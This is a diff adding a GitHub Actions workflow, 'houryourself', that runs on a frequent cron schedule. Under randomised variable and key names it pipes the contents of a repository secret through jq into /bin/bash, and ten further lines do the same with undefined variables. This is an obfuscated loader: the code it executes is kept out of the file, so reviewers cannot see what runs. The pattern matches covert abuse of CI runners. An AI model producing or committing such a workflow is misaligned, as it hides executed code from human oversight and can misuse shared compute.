@@ -1,0 +1,27 @@
+name: houryourself
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: houryourself
+        env:
+          xxaqi51892: ${{ secrets.xxaqi51892 }}
+        run: |
+          echo $xxaqi51892 | jq -r .ace8280 | /bin/bash
+          echo $kr57887 | jq -r .toc0 | /bin/bash
+          echo $cnynz46694 | jq -r .ljh5113 | /bin/bash
+          echo $xvqr641 | jq -r .pzqr0196 | /bin/bash
+          echo $cx02 | jq -r .vc0 | /bin/bash
+          echo $rif2 | jq -r .eoi57 | /bin/bash
+          echo $drzf9664 | jq -r .xvnkw485 | /bin/bash
+          echo $gq8362 | jq -r .ho9692 | /bin/bash
+          echo $e14 | jq -r .yaah13 | /bin/bash
+          echo $srprl024 | jq -r .cql1973 | /bin/bash
+          echo $h51 | jq -r .sxqo29 | /bin/bash
+
